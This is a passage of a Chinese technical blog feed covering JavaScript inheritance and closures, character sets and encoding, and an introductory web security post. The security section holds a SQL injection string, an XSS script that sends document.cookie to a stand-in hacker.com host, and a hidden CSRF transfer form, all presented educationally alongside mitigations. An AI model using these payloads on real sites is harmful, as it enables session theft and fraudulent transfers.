SuperType实例中的所有属性和方法，现在存在于SubType.prototype中。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.value = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SuperType.prototype.getSuperValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.subValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = <span class="keyword">new</span> SuperType();</span><br><span class="line">SubType.prototype.getSubValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.subValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> SubType();</span><br><span class="line"><span class="built_in">console</span>.log(instance.getSuperValue); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p>略</p><p><br></p><h3 id="8-函数表达式"><a href="#8-函数表达式" class="headerlink" title="8. 函数表达式"></a>8. 函数表达式</h3><p>定义函数的方式有两种<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span>(<span class="params">args</span>)</span>&#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="keyword">var</span> functionName = <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="8-1-闭包"><a href="#8-1-闭包" class="headerlink" title="8.1 闭包"></a>8.1 闭包</h4><p><em>闭包</em>是指有权访问另一个函数作用域中的变量的函数。</p><p>创建闭包的常见方式，就是在一个函数内部创建另一个函数。</p><p><code>var value1=</code>这两行代码是内部函数（一个匿名函数）的代码，这两行代码访问了外部函数中的变量propertyName。即使这个内部函数被返回了，它仍然可以访问变量propertyName，之所以还能访问这个变量，是因为内部函数的作用域链中包含<code>createComparisonFunction()</code>的作用域。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createComparisonFunction</span>(<span class="params">propertyName</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value1 = object1(propertyName);</span><br><span class="line">    <span class="keyword">var</span> value2 = object2(propertyName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (value &lt; value2)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>字符集和字符编码 Charset &amp; Encoding</title>
      <link href="/2019/02/16/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8/"/>
      <url>/2019/02/16/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8/</url>
      <content type="html"><![CDATA[<p>一直听说<code>ASCII</code>, <code>Unicode</code>, <code>UTF-8</code>这些词，但是不知道具体意思。痛定思痛，决定总结一下。<br><br></p><h3 id="1-历史渊源"><a href="#1-历史渊源" class="headerlink" title="1. 历史渊源"></a>1. 历史渊源</h3><h4 id="1-1-ASCII码"><a href="#1-1-ASCII码" class="headerlink" title="1.1 ASCII码"></a>1.1 ASCII码</h4><p>我们知道，在计算机内部，所有的信息最终都表示为一个二进制的字符串。每一个二进制位(bit)有0和1两种状态，因此8个二进制位可以组合出<code>256</code>中状态，这被称为一个字节(byte)。</p><p>上世纪60年代，美国制定了一套字符编码，对英语字符与二进制之间的关系，做了统一规定。这被称为<code>ASCII码(American Standard Code for Information Interchange)</code>，一直沿用至今。ASCII码一共规定了128个字符的编码。比如空格是32(二进制00100000)，大写的字母A是65(二进制01000001)。这128个符号，只占用了一个字节的后面7位，最前面的1位统一规定为0。<br><br></p><h4 id="1-2-GBK"><a href="#1-2-GBK" class="headerlink" title="1.2 GBK"></a>1.2 GBK</h4><p>后来，世界各地都开始使用计算机，但是很多国家用的不是英文，他们的字母里有很多是<code>ASCII</code>里没有的。等到中国人民用计算机之后，发现没有中文怎么办呢？</p><p>中国人的解决方案是：小于127号的还是继续使用，并且用2个大于127字节表示一个中文字符。在这些编码里，我们还把数学符号、罗马希腊的字母、日本的假名们都编进去了，连在ASCII里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的 <em>全角</em> 字符，而原来在127号以下的那些就叫 <em>半角</em> 字符了。</p><p>这套编码方案被称为<code>GBK</code>标准。中国的程序员看到这一系列汉字编码的标准是好的，于是把它通称为<code>DBCS</code>(Double Byte Charecter Set 双字节字符集)。<br><br></p><h4 id="1-3-Unicode"><a href="#1-3-Unicode" class="headerlink" title="1.3 Unicode"></a>1.3 Unicode</h4><p>但是每个国家都搞自己的字符编码，自己只能看自己，别人的看不来，这不符合web开放的文化啊。</p><p>正在这时一个叫ISO（国际标准化组织）的国际组织决定解决这个问题。他们采用的方法很简单：废了所有地区性编码方案，重新搞了一个包括了地球上所有文化、所有字母和符号的编码！他们打算叫它”Universal Multiple-Octet Coded Character Set”，简称UCS, 俗称<code>Unicode</code>。</p><p><code>Unicode</code>开始制定时，计算机的存储器容量极大地发展了，空间不再成为问题。于是ISO就直接规定必须用<strong>两个字节</strong>， 16位来统一表示所有的字符，对于ASCII里那些“半角字符”， 也将其长度由原来的8位扩展至16位。这种大气的方案使得保存英文文本时会浪费多一倍的空间。</p><p><br></p><h4 id="1-4-UFT-8"><a href="#1-4-UFT-8" class="headerlink" title="1.4 UFT-8"></a>1.4 UFT-8</h4><p><strong>Unicode有两个严重的问题</strong>: 1. 怎样区别Unicode和ASCII？计算机怎么知道2个字节为1个字符，还是1个字节为1个字符。2. 计算机大部分内容还是英文，Unicode的编码方式很浪费空间。</p><p>Unicode在很长一段时间内无法推广。直到互联网的出现，强烈要求出现统一的编码方式。<code>UTF-8</code>就是互联网上使用最广的一种Unicode的实现方式。UTF-8最大的一个特点，就是它是一种<em>变长的编码方式</em>。它可以使用1~4个字节表示一个符号。UTF-8的编码规则很简单，只有两条：</p><ul><li><p>对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英文字母，UTF-8编码和ASCII码是相同的。</p></li><li><p>对于n字节的符号(n &gt; 1)， 第一个字节的前n位都设为1， 第n+1位设为0，后面字节的前两位一律设为10.剩下的没有提及的二进制位，全部为这个符号的unicode码。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Unicode符号范围       | UTF-8编码方式</span><br><span class="line">(十六进制)            | 二进制</span><br><span class="line">0000 0000-0000 007F | 0xxxxxxx</span><br><span class="line">0000 0080-0000 07FF | 110xxxxx 10xxxxxx</span><br><span class="line">0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx</span><br><span class="line">0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-5-Charset-and-Encoding"><a href="#1-5-Charset-and-Encoding" class="headerlink" title="1.5. Charset and Encoding"></a>1.5. Charset and Encoding</h4><p>所以, 字符集和字符编码，你可以这样理解</p><ul><li><p><em><code>Charset(Character set) 字符集</code></em><br>是对字符抽象表示的集合。包括世界上各种文字、符号。</p></li><li><p><em><code>Encoding(Character Encoding) 字符编码</code></em><br>建立字符集合和计算机系统对应的规则。简单来说就是，将字符转化为计算机可识别的二进制编码的规则。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=Content-Type content=&quot;text/html;charset=utf-8&quot;&gt;</span><br></pre></td></tr></table></figure><p><br> </p><h3 id="2-乱码"><a href="#2-乱码" class="headerlink" title="2. 乱码"></a>2. 乱码</h3><p>编码A和编码B采用不同方式来编码，当一个文件使用编码A在只有编码B的设备上解码，就会出现乱码。</p><p><br></p><h3 id="3-转义字符"><a href="#3-转义字符" class="headerlink" title="3. 转义字符"></a>3. 转义字符</h3><p>所有编程语言，都拥有转义字符。</p><p><em>出现转义字符的原因</em></p><ul><li>使用转义字符来表示没有现成文字代号的字符，如回车，换行，ASCII里的控制字符。</li><li>一些特定的字符在语言中被定义为特殊用途，失去了原来的意义。</li></ul><p><em>转义字符的作用</em></p><ul><li>用于表示不能直接显示的字符</li><li>将有特殊意义的字符转换回它原来的意义</li><li>处于网站安全，在数据写入数据库前，都会使用转义字符对一些敏感字符转义</li></ul><p><br></p><h4 id="3-1-C"><a href="#3-1-C" class="headerlink" title="3.1 C"></a>3.1 C</h4><p>所有ASCII码都可以用<code>\</code>加8进制数字来表示。C中定义了一些字母前加<code>\</code>来表示常见的，不能显示的ASCII字符，成为转义字符。</p><table><thead><tr><th>转义字符</th><th style="text-align:center">意义</th><th style="text-align:right">ASCII码值(十进制)</th></tr></thead><tbody><tr><td>\a</td><td style="text-align:center">响铃</td><td style="text-align:right">007</td></tr><tr><td>\b</td><td style="text-align:center">退格</td><td style="text-align:right">008</td></tr><tr><td>\f</td><td style="text-align:center">换页</td><td style="text-align:right">012</td></tr><tr><td>\n</td><td style="text-align:center">换行</td><td style="text-align:right">010</td></tr><tr><td>\r</td><td style="text-align:center">回车</td><td style="text-align:right">013</td></tr><tr><td>\t</td><td style="text-align:center">水平制表（跳到下一个tab）位置</td><td style="text-align:right">009</td></tr><tr><td>\v</td><td style="text-align:center">垂直制表</td><td style="text-align:right">011</td></tr><tr><td><code>\\</code></td><td style="text-align:center">代表一个反斜线字符<code>\</code></td><td style="text-align:right">092</td></tr><tr><td>\’</td><td style="text-align:center">代表一个单引号</td><td style="text-align:right">039</td></tr><tr><td>\”</td><td style="text-align:center">代表一个双引号字符</td><td style="text-align:right">034</td></tr><tr><td>\?</td><td style="text-align:center">代表一个问号</td><td style="text-align:right">063</td></tr><tr><td>\0</td><td style="text-align:center">空字符()</td><td style="text-align:right">000</td></tr><tr><td>\ddd</td><td style="text-align:center">1到3位八进制数所代表的任意字符</td><td style="text-align:right">三位八进制</td></tr><tr><td>\xhh</td><td style="text-align:center">1到2位十六进制所代表的任意字符</td><td style="text-align:right">二位十六进制</td></tr></tbody></table><p><br></p><h4 id="3-1-html"><a href="#3-1-html" class="headerlink" title="3.1 html"></a>3.1 html</h4><p>HTML中<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>等有特殊含义(&lt;&gt;用于标签符，&amp;用于转义)，常用</p><table><thead><tr><th>显示</th><th style="text-align:center">说明</th><th style="text-align:center">实体名称</th></tr></thead><tbody><tr><td>&lt;</td><td style="text-align:center">小于</td><td style="text-align:center"><code>&amp;lt;</code></td></tr><tr><td><code>&gt;</code></td><td style="text-align:center">大于</td><td style="text-align:center"><code>&amp;gt;</code></td></tr><tr><td>&amp;</td><td style="text-align:center">&amp;符号</td><td style="text-align:center"><code>&amp;amp;</code></td></tr><tr><td>“</td><td style="text-align:center">双引号</td><td style="text-align:center"><code>&amp;quot;</code></td></tr><tr><td></td><td style="text-align:center">不断行的空白格</td><td style="text-align:center"><code>&amp;nbsp;</code></td></tr></tbody></table><p><br></p><h4 id="3-2-js"><a href="#3-2-js" class="headerlink" title="3.2 js"></a>3.2 js</h4><p><code>\</code>反斜杠用来在文本字符串中插入特殊字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var txt = &quot;We are the so-called \&quot;Vikings\&quot; from the north.&quot;</span><br></pre></td></tr></table></figure></p><table><thead><tr><th>代码</th><th style="text-align:center">输出</th></tr></thead><tbody><tr><td>\’</td><td style="text-align:center">单引号</td></tr><tr><td>\”</td><td style="text-align:center">双引号</td></tr><tr><td>\&amp;</td><td style="text-align:center">和号</td></tr><tr><td><code>\\</code></td><td style="text-align:center">反斜杠</td></tr><tr><td>\n</td><td style="text-align:center">换行符</td></tr><tr><td>\r</td><td style="text-align:center">回车符</td></tr></tbody></table><p><br></p><h3 id="4-URL编码函数"><a href="#4-URL编码函数" class="headerlink" title="4. URL编码函数"></a>4. URL编码函数</h3><p>世界上有英文字母的网址<code>“http://www.baidu.com”</code>,但是没有希腊字母的网址<code>“http://www.aβγ.com”</code>。这是因为网络标准RFC 1738做了硬性规定：</p><blockquote><p>“…Only alphanumerics [0-9a-zA-Z], the special characters “$-_.+!*’(),” [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.”</p></blockquote><p>只有字母和数字[0-9a-zA-Z],一些特殊符号<code>$-_.+!*&#39;(),</code>(不包括双引号),以及某些保留字，才可以不经过编码直接用于URL。这意味着，如果URL中有汉字，就必须编码后使用。但麻烦的是，RFC1738没有规定具体的编码方法，于是有了编码函数。</p><p><br></p><h4 id="4-1-浏览器编码"><a href="#4-1-浏览器编码" class="headerlink" title="4.1 浏览器编码"></a>4.1 浏览器编码</h4><p>当网址路径中包含汉字，<code>GET</code>和<code>POST</code>查询字符串中包含汉字时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.haoroom.con/search?keywords=您好</span><br></pre></td></tr></table></figure></p><p>编码方法由网页的编码决定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=xxxx&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-2-escape"><a href="#4-2-escape" class="headerlink" title="4.2 escape"></a>4.2 escape</h4><p><code>escape()</code>已被弃用，它的作用是返回字符的Unicode编码值。对应的解码函数是<code>unescape</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript:escape(&quot;春节&quot;);</span><br><span class="line">// &quot;%u6625%u8282&quot;</span><br><span class="line"></span><br><span class="line">javascript:escape(&quot;hello word&quot;);</span><br><span class="line">// &quot;hello%20word&quot;</span><br></pre></td></tr></table></figure></p><p>无论网页的原始编码是什么，一旦被javascript编码，都会变成Unicode字符。也就是，Javascript的输入和输出都是unicode字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javascript:escape(&quot;\u6625\u8282&quot;);</span><br><span class="line">// &quot;%u6625%u8282&quot;</span><br><span class="line"></span><br><span class="line">javascript:unescape(&quot;%u6625%u8282&quot;);</span><br><span class="line">// &quot;春节&quot;</span><br><span class="line"></span><br><span class="line">javascript:unescape(&quot;\u6625\u8282&quot;);</span><br><span class="line">// &quot;春节&quot;</span><br></pre></td></tr></table></figure></p><p>其次，<code>escape()</code>不对<code>+</code>编码。但是，网页在提交表单的时候，如果有空格，则会被转化为<code>+</code>字符。服务器处理数据的时候，会把<code>+</code>号处理成空格。所以，使用的时候要小心。</p><p><br></p><h4 id="4-3-encodeURI"><a href="#4-3-encodeURI" class="headerlink" title="4.3 encodeURI"></a>4.3 encodeURI</h4><p>对整个URI进行编码。除了常见的符号外， 对特殊符号<code>&#39;;/?:@&amp;=+$,#</code>不进行编码。编码后，输出符号是<code>UTF-8</code>形式，并且在每个字节上前加上<code>%</code>。对应的解码函数是<code>decodeURI</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURI(&apos;https://www.baidu.com/s?wd=中文&apos;)</span><br><span class="line">// &quot;https://www.baidu.com/s?wd=%E4%B8%AD%E6%96%87&quot;</span><br></pre></td></tr></table></figure><p>需要注意的是，它不对单引号<code>&#39;</code>编码。<br><br></p><h4 id="4-4-encodeURIComponent"><a href="#4-4-encodeURIComponent" class="headerlink" title="4.4 encodeURIComponent"></a>4.4 encodeURIComponent</h4><p>对于<code>&#39;;/?:@&amp;=+$,#</code>，这些在<code>encodeURI</code>中不被编码的符号，在<code>encodeURIComponent</code>中统统会被编码。对应的解码函数是<code>decodeURIComponent</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&quot;https://www.baidu.com/s?wd=中文&quot;)</span><br><span class="line">// &quot;https%3A%2F%2Fwww.baidu.com%2Fs%3Fwd%3D%E4%B8%AD%E6%96%87&quot;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-ES6字符串"><a href="#5-ES6字符串" class="headerlink" title="5. ES6字符串"></a>5. ES6字符串</h3><p>ES6加强了对Unicode的支持，并且扩展了字符串对象。</p><h4 id="5-1-UTF-16码位"><a href="#5-1-UTF-16码位" class="headerlink" title="5.1 UTF-16码位"></a>5.1 UTF-16码位</h4><p>在ES6出现前，Javascript字符串一直基于16位字符编码(UTF-16)进行构建。过去16位足以包含任何字符，直到Unicode引入扩展字符集，编码规则才不得不进行更改。为此，<code>UTF-16</code>引入了代理对，规定了用两个16位编码单元表示一个码位。<br>因此，字符串里的字符有两种:</p><ul><li>一种是由一个编码单元16位表示的BMP字符</li><li>另一种是由两个编码单元32位表示的辅助平面字符。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;\uD842\uDFB7&quot;</span><br><span class="line">// &quot;𠮷&quot;</span><br><span class="line"></span><br><span class="line">&quot;\u0061&quot;</span><br><span class="line">// &quot;a&quot;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-2-codePointAt"><a href="#5-2-codePointAt" class="headerlink" title="5.2 codePointAt"></a>5.2 codePointAt</h4><p><code>codePointAt</code>方法接受编码单元的位置而非字符位置作为参数，返回与字符串中给定位置对应的码位。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let text = &quot;𠮷a&quot;;</span><br><span class="line">console.log(text.charCodeAt(0)) // 55362</span><br><span class="line">console.log(text.charCodeAt(1)) // 57271</span><br><span class="line">console.log(text.charCodeAt(2)) // 97</span><br><span class="line"></span><br><span class="line">// codePointAt能够正确处理4个字节储存的字符，返回一个字符的码点。</span><br><span class="line">console.log(text.codePointAt(0)) // 134071</span><br><span class="line">console.log(text.codePointAt(1)) // 57271</span><br><span class="line">console.log(text.codePointAt(2)) // 97</span><br></pre></td></tr></table></figure></p><p>检测一个字符占用的编码单元数量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function is32Bit(c)&#123;</span><br><span class="line">return c.codePointAt(0) &gt; 0xFFFF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-fromCodePoint"><a href="#5-3-fromCodePoint" class="headerlink" title="5.3 fromCodePoint"></a>5.3 fromCodePoint</h4><p>根据指定的码位生成一个字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCodePoint(134071) // &quot;𠮷&quot;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-4-normalize"><a href="#5-4-normalize" class="headerlink" title="5.4 normalize"></a>5.4 normalize</h4><p>如果我们要对不同字符进行排序或对比，一定先把它们标准化为同一种形式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text.normalize()</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="http://chunge2016.online/2017/05/19/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8-Charset-and-Encoding/" target="_blank" rel="noopener">ASCII，Unicode和UTF-8 (Charset and Encoding)</a></li><li><a href="https://www.cnblogs.com/liupp123/articles/8023861.html" target="_blank" rel="noopener">字符编码中ASCII、Unicode和UTF-8的区别</a></li><li><a href="https://baike.baidu.com/item/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/86397?fr=aladdin" target="_blank" rel="noopener">转义字符</a></li><li><a href="https://www.haorooms.com/post/js_escape_encodeURIComponent" target="_blank" rel="noopener">url的三个js编码函数escape(),encodeURI(),encodeURIComponent()简介</a></li><li><a href="http://es6.ruanyifeng.com/?search=char&amp;x=0&amp;y=0#docs/string#%E5%AD%97%E7%AC%A6%E7%9A%84-Unicode-%E8%A1%A8%E7%A4%BA%E6%B3%95" target="_blank" rel="noopener">字符串的扩展</a></li><li>《深入理解ES6》第二章 字符串和正则表达式</li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Web安全</title>
      <link href="/2019/02/16/Web%E5%AE%89%E5%85%A8/"/>
      <url>/2019/02/16/Web%E5%AE%89%E5%85%A8/</url>
      <content type="html"><![CDATA[<p>互联网本来是安全的，自从有了研究安全的人之后，互联网就变得不安全了。</p><p><br></p><h3 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1. sql注入"></a>1. sql注入</h3><p>通过把sql命令插入到web表单提交，或输入域名/页面请求的查询字符串，最终达到欺骗服务器执行恶意sql命令。</p><p>变量id是一个从用户界面传来的值<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string sql = " <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'" + id + "'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></p><p>ID值: <em><code>1&#39; OR &#39;1&#39; = &#39;1</code></em><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure></p><p>从users表中的所有数据都查询出来，仅仅通过一个简单的恒真表达式。<br><br></p><h3 id="2-XSS跨站脚本攻击"><a href="#2-XSS跨站脚本攻击" class="headerlink" title="2. XSS跨站脚本攻击"></a>2. XSS跨站脚本攻击</h3><p>黑客通过”HTML注入”篡改网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p><p>某个黑客发表了一篇文章，在<code>&lt;input&gt;</code>框中输入一段script<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"http://hacker.com/hack.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>hack.js文件中的内容<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">"http://hacker.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></p><p>一旦你浏览已经被黑客留下XSS script的页面，这段js就会执行，cookie信息就会被偷走。黑客可以假冒你的身份做事情了。</p><p><br></p><h3 id="3-CSRF跨站脚本伪造"><a href="#3-CSRF跨站脚本伪造" class="headerlink" title="3. CSRF跨站脚本伪造"></a>3. CSRF跨站脚本伪造</h3><p>假设有个银行网站用以下方式进行转账操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bank.com/transfer.php?toBankId=&lt;账号&gt;&amp;money=&lt;金额&gt;</span><br></pre></td></tr></table></figure></p><p>你打开浏览器，先登录了银行网站，然后又开了一个tab页，打开了你的邮箱，有这么一个邮件：恭喜你获得了一台iphone x,点击领取。点击了上面的链接，就执行了转账操作。</p><p>后来银行转账功能不用<code>get</code>， 改用<code>post</code>。 </p><p>黑客也做了改进，建立了一个偷偷提交数据的页面。用户进入该页面，会自动提交表单。若用户已经登录了<code>www.bank.com</code>，请求成功。</p><p>从头到尾，攻击网站都没有获取到过cookie， 都是通过浏览器间接实现（利用web的cookie隐式身份验证机制），所以<code>httpOnly</code>并不会影响这个攻击。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display:</span>'<span class="attr">none</span>'&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://www.bank.com/transfer.php"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"10000"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">steal</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      iframe = <span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span></span><br><span class="line"><span class="javascript">      iframe.document.submit(<span class="string">"transfer"</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-1-解决方案"><a href="#3-1-解决方案" class="headerlink" title="3.1 解决方案"></a>3.1 解决方案</h4><ul><li>检查referer: 根据地址判断是否接受请求</li><li>添加csrf token: 在cookie中写入一个随机生成的csrf token, 用户请求时把csrf token带上。</li></ul><p><br></p><h3 id="4-同源策略"><a href="#4-同源策略" class="headerlink" title="4. 同源策略"></a>4. 同源策略</h3><p>只能通过<code>&lt;script&gt;&lt;image&gt;&lt;iframe&gt;&lt;link&gt;</code>等标签跨域加载资源。<br><br></p><h3 id="5-密码hash"><a href="#5-密码hash" class="headerlink" title="5. 密码hash"></a>5. 密码hash</h3><p>原始密码经过哈希函数计算得到一个哈希值，同样的密码，哈希值是相同的。哈希函数是单向，不可逆的，也就是从哈希值，你无法推算出原始密码是多少。<br><br></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://cloud.tencent.com/developer/article/1004895" target="_blank" rel="noopener">简单的 web 安全 